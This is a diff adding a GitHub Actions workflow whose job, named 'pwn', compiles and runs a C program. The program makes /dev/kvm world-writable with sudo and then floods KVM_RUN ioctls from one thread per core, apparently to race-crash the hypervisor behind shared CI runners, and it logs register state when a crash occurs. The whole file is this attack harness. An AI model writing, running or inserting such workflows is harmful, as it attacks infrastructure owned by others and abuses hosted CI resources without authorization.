@@ -1,0 +1,95 @@
+name: kvm:race:ci
+on: [workflow_dispatch]
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: compile_and_exec
+        run: |
+          cat << 'EOF2' > x.c
+          #define _GNU_SOURCE
+          #include <signal.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <fcntl.h>
+          #include <unistd.h>
+          #include <sys/ioctl.h>
+          #include <linux/kvm.h>
+          #include <pthread.h>
+          #include <ucontext.h>
+
+          #define MAX_THREADS 32
+
+          int kvm_fd, vm_fd;
+          int vcpu_fds[MAX_THREADS];
+          volatile unsigned long long global_iters = 0;
+          int num_cores = 4;
+
+          void crash_handler(int sig, siginfo_t *info, void *ctx) {
+              ucontext_t *uc = (ucontext_t *)ctx;
+              fprintf(stderr, "\n[!] CRASH CAUGHT: sig=%d | fault_addr=%p\n", sig, info->si_addr);
+              #if defined(__x86_64__)
+              fprintf(stderr, "[!] REGISTERS -> RIP: 0x%016llx | RSP: 0x%016llx\n", 
+                  (unsigned long long)uc->uc_mcontext.gregs[REG_RIP],
+                  (unsigned long long)uc->uc_mcontext.gregs[REG_RSP]);
+              #endif
+              fflush(stderr);
+              _exit(138);
+          }
+
+          void* race(void* arg) {
+              int tid = *(int*)arg;
+              int my_vcpu = vcpu_fds[tid];
+
+              struct sigaction sa = {0};
+              sa.sa_sigaction = crash_handler;
+              sa.sa_flags = SA_SIGINFO;
+              sigaction(SIGSEGV, &sa, NULL);
+              sigaction(SIGBUS, &sa, NULL);
+
+              unsigned long long local_iters = 0;
+              while(1) {
+                  local_iters++;
+                  if ((local_iters & 0x3FFFFF) == 0) {
+                      __atomic_add_fetch(&global_iters, 0x400000, __ATOMIC_RELAXED);
+                      fprintf(stderr, "[+] telemetry: core=%d | total_iters=%llu\n", tid, global_iters);
+                      fflush(stderr);
+                  }
+                  ioctl(my_vcpu, KVM_RUN, 0);
+              }
+          }
+
+          int main() {
+              kvm_fd = open("/dev/kvm", O_RDWR);
+              if (kvm_fd < 0) { perror("open kvm"); return 1; }
+
+              vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
+              if (vm_fd < 0) { perror("create vm"); return 1; }
+
+              num_cores = sysconf(_SC_NPROCESSORS_ONLN);
+              if (num_cores > MAX_THREADS) num_cores = MAX_THREADS;
+              fprintf(stderr, "[+] detected cores: %d. spawning vcpus...\n", num_cores);
+
+              pthread_t t[MAX_THREADS];
+              int tids[MAX_THREADS];
+
+              for(int i = 0; i < num_cores; i++) {
+                  vcpu_fds[i] = ioctl(vm_fd, KVM_CREATE_VCPU, i);
+                  if (vcpu_fds[i] < 0) { perror("create vcpu"); return 1; }
+                  tids[i] = i;
+                  pthread_create(&t[i], NULL, race, &tids[i]);
+              }
+
+              fprintf(stderr, "[+] saturation active. hammering KVM ioctls across %d threads...\n", num_cores);
+              fflush(stderr);
+
+              for(int i = 0; i < num_cores; i++) {
+                  pthread_join(t[i], NULL);
+              }
+              return 0;
+          }
+          EOF2
+          gcc -O3 -pthread x.c -o pwn_core
+          sudo chmod 666 /dev/kvm
+          ./pwn_core
